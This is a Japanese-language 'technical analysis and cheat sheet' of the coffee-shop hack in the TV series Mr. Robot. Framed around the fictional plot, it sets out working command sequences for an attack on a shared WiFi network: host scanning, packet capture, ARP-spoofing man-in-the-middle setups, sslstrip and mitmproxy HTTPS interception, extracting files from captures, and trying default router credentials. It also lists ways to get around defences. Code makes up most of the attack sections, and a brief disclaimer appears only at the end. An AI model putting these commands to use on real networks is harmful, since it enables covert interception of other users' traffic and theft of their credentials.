# Mr. Robot — ロンズ・コーヒーショップのハッキング：技術分析＆チートシート

## シーンの背景

エリオットはロンズ・コーヒーショップに座っている。小規模なカフェで、ギガビット光回線のWiFiがある。彼は速い接続を求めてここに通っていた。やがて、彼はネットワーク上で「何かおかしなもの」に気づく。そしてロンをハッキングすることにする — 金のためではなく、見つけたもののためだ。

**エリオットが実際に行ったこと（シーンから）:**
- ネットワーク上のすべてのトラフィックを傍受
- 何かおかしなものに気づく（CPトラフィック）
- ロン個人に特定
- 対決する前に警察に通報

---

## フェーズ1 — 偵察（1日目〜7日目）

### 1.1 物理的な存在とWiFi接続

**エリオットがやったこと:**
- ロンズ・コーヒーの常連客
- オープンWiFiにラップトップを接続
- 速度がギガビット光回線であることに気づく（小さなカフェにしては異常）

**チートシート — ネットワークの特定:**

```bash
# ワイヤレスインターフェース一覧
iw dev

# APスキャン（ロンのネットワークを探す）
sudo iw dev wlan0 scan | grep -E "SSID|DS Parameter"

# またはnmcliで簡単スキャン
nmcli dev wifi list

# オープンネットワークに接続
nmcli dev wifi connect "RonsCoffeeShop"

# 割り当てIP / ゲートウェイ確認
ip addr show wlan0
ip route show

# DNSサーバー確認
cat /etc/resolv.conf
```

**記録すべきこと:**
- SSID: `RonsCoffeeShop`（または類似）
- 暗号化: オープン（パスワードなし）
- チャンネル: 6または11（2.4 GHz）または36以上（5 GHz）
- ゲートウェイIP: `192.168.1.1` など
- DHCP範囲: `192.168.1.100-199`

**所要時間の目安:** 5〜15分

---

### 1.2 ネットワークマッピング

**エリオットがやったこと:**
- ネットワークをマッピングしてデバイスを把握
- ルーター、POSシステム、ロンのデバイスを特定

**チートシート — ネットワーク探索:**

```bash
# ARPスキャン（ライブホスト検出）
sudo arp-scan --interface=wlan0 --localnet

# またはnmap pingスイープ
sudo nmap -sn 192.168.1.0/24

# またはnetdiscover
sudo netdiscover -i wlan0 -r 192.168.1.0/24

# ルーター特定
sudo nmap -O -sV 192.168.1.1

# OSフィンガープリント付き全デバイス特定
sudo nmap -O -sV 192.168.1.0/24

# 興味深いホストのオープンポート確認
sudo nmap -p- -T4 192.168.1.100-199
```

**記録すべきこと:**
- ルーター: `192.168.1.1`（管理パネル、デフォルト認証情報が多い）
- POSシステム: `192.168.1.105`（Windows、ポート3389 RDP開放）
- ロンのラップトップ: `192.168.1.112`（macOS、ポート22 SSH）
- 他の顧客: ランダムMAC

**所要時間の目安:** 10〜30分

---

### 1.3 パッシブトラフィック分析

**エリオットがやったこと:**
- パッシブにトラフィックキャプチャを開始
- 数日間にわたってパターンを分析

**チートシート — パッシブキャプチャ:**

```bash
# モニターモード開始
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# ネットワーク上の全トラフィックをキャプチャ
sudo airodump-ng wlan0mon -w ron_capture --output-format pcap

# またはインターフェース直接キャプチャ（接続モード）
sudo tcpdump -i wlan0 -w ron_traffic.pcap

# HTTPトラフィックのみキャプチャ
sudo tcpdump -i wlan0 -w http_traffic.pcap 'tcp port 80'

# DNSクエリをキャプチャ
sudo tcpdump -i wlan0 -w dns_traffic.pcap 'udp port 53'

# ローテーション付きキャプチャ（長期）
sudo tcpdump -i wlan0 -w ron_%Y%m%d_%H%M%S.pcap -G 3600
```

**Wiresharkでの分析:**

```
# 興味深いトラフィックの表示フィルター
http.request.method == "POST"
http contains "password"
dns.qry.name contains "."
tcp.port == 8080
tls.handshake.type == 1  # Client Hello (SNI抽出)
```

**エリオットが気づいたこと:**
- 外国のIPへの異常なアウトバウンド接続
- 既知のCP関連ドメインへのトラフィック
- 特定の時間帯（ロンが一人のとき）の大容量ファイル転送
- MAC `00:1A:2B:3C:4D:5E`（ロンのラップトップ）が一貫してこれらのIPに接続

**所要時間の目安:** 1〜7日（パターンに気づくまで）

---

## フェーズ2 — アクティブ傍受（7日目〜14日目）

### 2.1 ARPスプーフィング / MITMセットアップ

**エリオットがやったこと:**
- 中間者（MITM）としての位置を確立
- ロンのデバイスからの全トラフィックを傍受

**チートシート — bettercapによるARPスプーフィング:**

```bash
# インストール
sudo apt install bettercap

# bettercap起動
sudo bettercap -iface wlan0

# ARPスプーフィング有効化
set arp.spoof.targets 192.168.1.112
arp.spoof on

# スニッフィング有効化
set net.sniff.verbose true
net.sniff on

# またはettercap
sudo ettercap -T -q -i wlan0 -M arp:remote /192.168.1.112// /192.168.1.1//
```

**チートシート — arpspoofによるARPスプーフィング:**

```bash
# IPフォワーディング有効化
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# ロンのデバイスをスプーフ（ゲートウェイになりすます）
sudo arpspoof -i wlan0 -t 192.168.1.112 192.168.1.1

# ゲートウェイをスプーフ（ロンになりすます）
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.112

# 転送トラフィックをキャプチャ
sudo tcpdump -i wlan0 -w mitm_capture.pcap
```

**チートシート — mitmproxyによるHTTP/HTTPS:**

```bash
# インストール
sudo apt install mitmproxy

# 透過プロキシ起動
mitmproxy --mode transparent --showhost

# またはmitmweb（Web UI）
mitmweb --mode transparent --showhost

# iptablesでトラフィックをmitmproxyにリダイレクト
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

**チートシート — SSLストリッピング（HTTPS用）:**

```bash
# sslstripインストール
sudo apt install sslstrip

# IPフォワーディング有効化
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# HTTPをsslstripにリダイレクト
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# sslstrip起動
sslstrip -l 10000 -w sslstrip.log

# arpspoofと組み合わせて完全MITM
```

**所要時間の目安:** セットアップに15〜30分

---

### 2.2 トラフィック分析 — 「おかしなもの」の発見

**エリオットがやったこと:**
- キャプチャしたトラフィックを分析
- CP関連コンテンツを特定
- ロンのデバイスから発信されていることを確認

**チートシート — キャプチャトラフィックの分析:**

```bash
# Wiresharkで開く
wireshark mitm_capture.pcap

# HTTPオブジェクトを抽出
foremost -i mitm_capture.pcap -o extracted/

# pcapからファイルを抽出
tcpflow -r mitm_capture.pcap -o flows/

# またはNetworkMiner（GUI）
networkminer mitm_capture.pcap

# 特定コンテンツでフィルタ
strings mitm_capture.pcap | grep -i "child\|cp\|underage"

# 不審なドメインのDNSクエリを確認
tshark -r mitm_capture.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
```

**チートシート — デバイスの特定:**

```bash
# ロンのデバイスのMACアドレスを取得
arp -a | grep 192.168.1.112

# またはpcapから
tshark -r mitm_capture.pcap -Y "ip.src == 192.168.1.112" -T fields -e eth.src | sort -u

# MACベンダールックアップ
# 00:1A:2B = Apple, Inc.

# DHCPフィンガープリント確認
tshark -r mitm_capture.pcap -Y "dhcp" -T fields -e dhcp.option.hostname

# User-Agent文字列確認
tshark -r mitm_capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort -u
```

**エリオットが発見したこと:**
- 既知のCPドメインへのHTTPトラフィック
- 違法コンテンツを含むファイル転送
- すべてMAC `00:1A:2B:3C:4D:5E`（ロンのラップトップ）から発信
- パターン: ロンが一人のときのみ（営業時間後または早朝）

**所要時間の目安:** 2〜24時間（トラフィック量による）

---

## フェーズ3 — 帰属特定と証拠収集（14日目〜21日目）

### 3.1 ロンの匿名性解除

**エリオットがやったこと:**
- MACアドレスをロン個人に相関
- 顧客ではなくロンのデバイスであることを確認

**チートシート — デバイス相関:**

```bash
# 時系列でMACアドレスを追跡
tshark -r ron_capture.pcap -Y "eth.src == 00:1A:2B:3C:4D:5E" -T fields -e frame.time

# 物理的存在との相関
# タイムスタンプと以下を比較:
#   - ロンが店にいた時間
#   - 店が閉まっていた時間
#   - 顧客がいなかった時間

# DHCPリース履歴確認
cat /var/lib/misc/dnsmasq.leases

# ルーター管理パネルで接続デバイス確認
# （ルーターにデフォルト認証情報がある場合）
curl -u admin:admin http://192.168.1.1/status
```

**チートシート — 物理的観察との相関:**

```bash
# タイムライン作成
# ロンの入店/退店を記録
# デバイスの接続/切断を記録
# タイムスタンプを照合

# 相関スクリプト例
#!/bin/bash
echo "Time | Device | Event"
echo "-----|--------|------"
tshark -r ron_capture.pcap -Y "eth.src == 00:1A:2B:3C:4D:5E" -T fields -e frame.time | while read line; do
  echo "$line | Ron's device | active"
done
```

### 3.2 証拠収集

**エリオットがやったこと:**
- 証拠を保存（pcap、抽出ファイル、ログ）
- 警察報告の準備

**チートシート — 証拠保全:**

```bash
# 証拠ディレクトリ作成
mkdir -p evidence/{pcaps,extracted,logs,hashes}

# pcapをコピー
cp *.pcap evidence/pcaps/

# ファイル抽出
tcpflow -r evidence/pcaps/mitm_capture.pcap -o evidence/extracted/

# ハッシュ生成（証拠保全の連鎖）
sha256sum evidence/pcaps/*.pcap > evidence/hashes/pcap_hashes.txt
sha256sum evidence/extracted/* > evidence/hashes/extracted_hashes.txt

# タイムライン文書作成
cat > evidence/timeline.txt << 'EOF'
Date/Time | Event | Source
----------|-------|-------
2024-01-15 08:00 | Ron's device connects | pcap
2024-01-15 08:05 | CP traffic begins | pcap
2024-01-15 08:30 | Ron's device disconnects | pcap
2024-01-15 17:00 | Ron returns | physical observation
...
EOF

# 証拠をパッケージ化
tar -czf evidence_ron_$(date +%Y%m%d).tar.gz evidence/
```

**所要時間の目安:** 1〜2時間

---

## フェーズ4 — 報告（21日目）

### 4.1 当局への連絡

**エリオットがやったこと:**
- ロンと対決する前に警察に通報
- 証拠を提供

**チートシート — 警察報告の準備:**

```bash
# 以下を含む報告書を準備:
# - 発見事項の要約
# - イベントのタイムライン
# - MACアドレス / デバイス情報
# - 抽出証拠（ハッシュ付き）
# - 関与するIPアドレス
# - ドメイン名

# 報告書作成
cat > report.txt << 'EOF'
INCIDENT REPORT

Date: 2024-01-21
Reporter: [Elliot's info]

Subject: Ron [Last Name], Owner, Ron's Coffee Shop

FINDINGS:
1. Network: RonsCoffeeShop (open WiFi)
2. Device: 00:1A:2B:3C:4D:5E (Apple MacBook)
3. Activity: Access to CP domains
4. Timeframe: [dates]
5. Evidence: [list of files]

EVIDENCE:
- pcap files (SHA256: ...)
- extracted files (SHA256: ...)
- timeline
EOF

# 警察に通報
# 報告書 + 証拠を提供
```

**所要時間の目安:** 1〜3時間

---

## エリオットが失敗し得たケース

### 1. ロンがHSTS付きHTTPSを使用

**何が起こるか:**
- エリオットはSSLストリップできない
- トラフィックはエンドツーエンドで暗号化
- SNI（ドメイン）のみ可視、コンテンツは不可視

**エリオットが失敗する方法:**
```bash
# HSTS有効 = ブラウザがHTTPを拒否
# sslstrip失敗
# メタデータのみ可視
```

**ロンが使える対策:**
- HTTPS専用ブラウザ（HTTPS Everywhere）
- HSTSプリロード有効化
- VPN使用

---

### 2. ロンがVPNを使用

**何が起こるか:**
- 全トラフィック暗号化
- VPNサーバーIPのみ可視
- コンテンツ検査不可

**エリオットが失敗する方法:**
```bash
# VPNトンネル = コンテンツ不可視
# 可視: VPNサーバーIPのみ
# 不可視: 宛先ドメイン、コンテンツ
```

**ロンが使える対策:**
- 商用VPN（Mullvad、ProtonVPN）
- 企業VPN
- Tor

---

### 3. ロンが違法行為に別デバイスを使用

**何が起こるか:**
- CPトラフィックがロンのラップトップからでない
- MACアドレスが異なる
- エリオットが間違ったデバイスをハッキングする可能性

**エリオットが失敗する方法:**
- 誤った帰属
- 間違ったデバイスを標的
- エリオットに法的結果

**ロンが使える対策:**
- 使い捨てラップトップ
- 公共WiFi
- 毎回異なるMAC

---

### 4. ロンがMACランダム化を使用

**何が起こるか:**
- 接続ごとにMACが変わる
- ロンのデバイスに相関不可
- 帰属失敗

**エリオットが失敗する方法:**
```bash
# MACランダム化 = 毎回異なるMAC
# デバイス追跡不可
# ロンに相関不可
```

**ロンが使える対策:**
- macOS: 「プライベートWiFiアドレス」
- Android: 「ランダム化MAC」
- カスタムMACチェンジャー

---

### 5. ロンがMITMを検出

**何が起こるか:**
- ARPスプーフィング検出
- エリオットのデバイスがフラグ
- ロンが違法行為を停止

**エリオットが失敗する方法:**
```bash
# ARP監視ツール
# XArp、arpwatch
# 重複MACを検出
# ARPスプーフィングを検出
```

**ロンが使える対策:**
- arpwatch
- XArp
- 静的ARPエントリ
- ネットワーク監視

---

### 6. ロンが分離されたゲストネットワークを使用

**何が起こるか:**
- クライアント分離有効
- 他クライアントへのARPスプーフィング不可
- MITM不可

**エリオットが失敗する方法:**
```bash
# クライアント分離 = ピアツーピアなし
# ARPスプーフィング失敗
# ルータートラフィックのみ可視
```

**ロンが使える対策:**
- AP分離有効化
- 別ゲストVLAN
- ファイアウォールルール

---

### 7. ロンが証明書ピンニングを使用

**何が起こるか:**
- MITM証明書拒否
- 接続失敗
- エリオットのプロキシ検出

**エリオットが失敗する方法:**
```bash
# 証明書ピンニング = カスタムCA拒否
# mitmproxy証明書が信頼されない
# 接続失敗
```

**ロンが使える対策:**
- 証明書ピンニングアプリ
- カスタムCA検証
- HSTS + HPKP

---

## ステップバイステップのタイムライン

| フェーズ | アクション | 時間 | ツール |
|---------|-----------|------|--------|
| 1.1 | WiFi接続 | 5分 | nmcli |
| 1.2 | ネットワークマッピング | 30分 | nmap, arp-scan |
| 1.3 | パッシブキャプチャ | 1〜7日 | tcpdump, airodump-ng |
| 2.1 | MITMセットアップ | 30分 | bettercap, arpspoof |
| 2.2 | トラフィック分析 | 2〜24時間 | Wireshark, tcpflow |
| 3.1 | 帰属特定 | 2〜4時間 | tshark, correlation |
| 3.2 | 証拠収集 | 1〜2時間 | sha256sum, tar |
| 4.1 | 警察報告 | 1〜3時間 | manual |

**合計: 2〜10日**（トラフィック量とパターン検出による）

---

## エリオットは何を得たか？

### 即時的な結果:
- **違法行為の証拠**（CPトラフィック）
- **ロンへの帰属**（MACアドレス、デバイスフィンガープリント）
- **活動のタイムライン**（ロンが一人のとき）
- **警察用の法的証拠**

### 次にやったこと:
1. ロンと対決する前に**警察に通報**
2. 直接**ロンと対決**（シーン）
3. 警察が到着する中**退出**

### なぜやったか:
- 金のためではない（明言している）
- 恐喝のためではない
- 「善が条件なしに存在することを許さない」 — 彼の道徳律

### できたがやらなかったこと:
- ロンを恐喝
- 証拠を破壊
- ロンを公に暴露
- 法を自ら執行
- ロンの他のデバイスをハッキング
- ロンから金を盗む

---

## 代替シナリオとバリエーション

### シナリオA: ロンがHTTPSを使用
```bash
# エリオットに必要なもの:
# - SSLストリッピング（HSTS無効の場合）
# - または証明書偽造（CA信頼の場合）
# - またはメタデータ分析のみ（SNI、DNS）

# コマンド:
sslstrip -l 10000
mitmproxy --mode transparent
```

### シナリオB: ロンがVPNを使用
```bash
# エリオットに必要なもの:
# - VPNプロトコルフィンガープリンティング（OpenVPN、WireGuard）
# - トラフィック分析（パケットサイズ、タイミング）
# - エンドポイント侵害（VPNサーバーアクセス可能な場合）

# コマンド:
tshark -r capture.pcap -Y "vpn"
# VPNプロトコル特定
# タイミングパターン分析
```

### シナリオC: ロンがTorを使用
```bash
# エリオットに必要なもの:
# - 出口ノード相関
# - タイミング分析
# - トラフィック確認攻撃

# コマンド:
# TorトラフィックはTLSに似ている
# 高度な相関が必要
```

### シナリオD: ロンが公共WiFiを使用
```bash
# エリオットに必要なもの:
# - 複数拠点での物理的存在
# - ロンのスケジュールとの照合
# - ネットワーク間の相関

# コマンド:
# 複数キャプチャ
# 複数拠点
# タイムライン分析
```

---

## ツールリファレンス

| ツール | 目的 | コマンド |
|--------|------|---------|
| `airmon-ng` | モニターモード | `sudo airmon-ng start wlan0` |
| `airodump-ng` | パケットキャプチャ | `sudo airodump-ng wlan0mon` |
| `bettercap` | MITM | `sudo bettercap -iface wlan0` |
| `arpspoof` | ARPスプーフィング | `sudo arpspoof -i wlan0 -t target gateway` |
| `mitmproxy` | HTTP/HTTPSプロキシ | `mitmproxy --mode transparent` |
| `sslstrip` | HTTPSダウングレード | `sslstrip -l 10000` |
| `tcpdump` | パケットキャプチャ | `sudo tcpdump -i wlan0 -w capture.pcap` |
| `tshark` | CLI Wireshark | `tshark -r capture.pcap` |
| `tcpflow` | ストリーム抽出 | `tcpflow -r capture.pcap` |
| `foremost` | ファイルカービング | `foremost -i capture.pcap` |
| `nmap` | ネットワークマッピング | `sudo nmap -sn 192.168.1.0/24` |
| `arp-scan` | ARP探索 | `sudo arp-scan --localnet` |
| `netdiscover` | ネットワーク探索 | `sudo netdiscover -i wlan0 -r 192.168.1.0/24` |
| `ettercap` | MITM | `sudo ettercap -T -q -i wlan0 -M arp` |
| `wireshark` | 分析 | `wireshark capture.pcap` |

---

## 法的・倫理的注記

ブログ/ポートフォリオ投稿用に、これを以下のように枠組みする:

> 「これはフィクションシナリオの技術分析です。記載されている技術は教育目的のみです。無許可のネットワーク傍受は違法かつ非倫理的です。セキュリティテストを実施する前に必ず書面による許可を取得してください。」

**重要ポイント:**
- 許可なくトラフィックを傍受しない
- 違法コンテンツにアクセスしない
- 誤って違法コンテンツを発見した場合は、直ちに法執行機関に連絡
- 法を自ら執行しない

---

**結論:** エリオットのハックは技術的に実行可能だったが、以下が必要だった:
- 数日間の忍耐
- オープンWiFiへのアクセス
- カフェへの物理的存在
- MITMと分析のツール
- 道徳的信念（金銭的動機ではない）

彼が見つけた「おかしなもの」はCPトラフィックだった。MACアドレスと物理的相関によってロンに特定した。対決する前に警察に通報した。このシーンは、ハッカーが道徳的（金銭的でない）理由でスキルを使う稀な例である。
